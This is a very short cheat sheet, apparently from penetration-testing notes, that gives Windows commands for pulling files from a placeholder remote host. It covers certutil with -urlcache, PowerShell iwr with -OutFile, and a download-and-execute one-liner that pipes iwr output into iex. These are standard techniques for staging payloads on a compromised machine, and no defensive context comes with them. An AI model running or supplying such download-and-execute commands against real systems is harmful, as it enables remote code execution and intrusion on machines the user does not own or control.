
For Downloading a file:

`certutil -urlcache -f http://<ip>:<port>/<filename>`

In Powershell, 

`iwr "http://<ip>:<port>/<filename>" -OutFile <filename>`

Download and Execute

`iwr "http://<ip>:<port>/<filename>" | iex

